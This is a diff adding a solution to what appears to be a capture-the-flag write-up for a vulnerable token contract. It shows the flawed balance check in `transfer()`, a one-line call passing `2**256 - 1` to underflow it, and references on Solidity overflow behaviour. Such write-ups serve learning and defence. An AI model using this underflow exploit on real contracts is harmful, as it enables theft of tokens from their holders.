@@ -326,12 +326,26 @@ The check at the factory will work as it is perform by the test contract.
 
 To beat this level, we need to comply with
 
-...
+```solidity
+token.balanceOf(_player) > playerSupply;
+```
 
 ### Solution
 
-* TODO
+Notice the control at the `transfer()` function
+
+```solidity
+require(balances[msg.sender] - _value >= 0);
+```
+
+If we use the value `2**256 - 1`, then the difference will underflow, bypassing the condition:
+
+```solidity
+challenge.transfer(msg.sender, 2**256 - 1);
+```
 
 ### References
 
-* TODO
+* https://solidity-by-example.org/hacks/overflow/
+  * Notice that for `Solidity >= 0.8`, default behaviour of Solidity 0.8 for overflow / underflow is to throw an error.
+* https://hackernoon.com/hack-solidity-integer-overflow-and-underflow
